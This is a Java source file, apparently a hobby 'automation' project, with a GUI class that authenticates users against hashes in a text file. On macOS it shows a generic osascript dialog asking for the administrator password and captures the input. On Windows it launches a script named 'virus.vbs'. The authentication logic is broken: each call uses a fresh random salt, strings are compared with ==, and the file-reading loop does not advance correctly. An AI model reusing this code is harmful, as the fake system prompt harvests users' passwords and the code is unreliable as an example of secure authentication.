package automation;

import java.awt.AWTException;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.stream.Collectors;
public class GUI {
	// Gui 
	private static String getPass() throws AWTException, IOException{
		String os_name=System.getProperty("os.name").toLowerCase();
		String password = "";
		if (os_name.contains("mac os")) {
			String[] commandToRun = { "osascript", "-e", "set theResponse to display dialog \"Enter administrator password to continue\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n" + 
					"return theResponse" };
			Runtime run = Runtime.getRuntime();
			InputStream inputStream=run.exec(commandToRun).getInputStream();
			password=new BufferedReader(new InputStreamReader(inputStream)).lines().collect(Collectors.joining("\n"));
		}
		else {
			String[] commandToRun = {"cmd.exe","/c","start", "cd eclipse-workspace", "virus.vbs"};
			Runtime run = Runtime.getRuntime();
			run.exec(commandToRun);
		}
		return password;
	}
	public static boolean authenticate() throws AWTException, IOException {
		String salt = Auth.generateSalt(256).toString();
		String hashed_pass=Auth.hashPassword(GUI.getPass(), salt).toString();
		FileReader file = new FileReader("data.txt");
		BufferedReader data = new BufferedReader(file);
		String line = data.readLine();
		while (line!=null) {
			if (hashed_pass == data.readLine()) {
				data.close();
				return true;
			}
			data.readLine();
		}
		data.close();
		return false;
	}
	public void createNewUser(String username, String hashed_pass) throws IOException {
		FileWriter file = new FileWriter("data.txt", true);
		file.append(username+""+hashed_pass+"\n");
		file.close();
	}
	public static void main(String[] args) throws AWTException, IOException {
		Auto robo = new Auto();
		if (GUI.authenticate()==false) {
			System.exit(0);
	}
	}
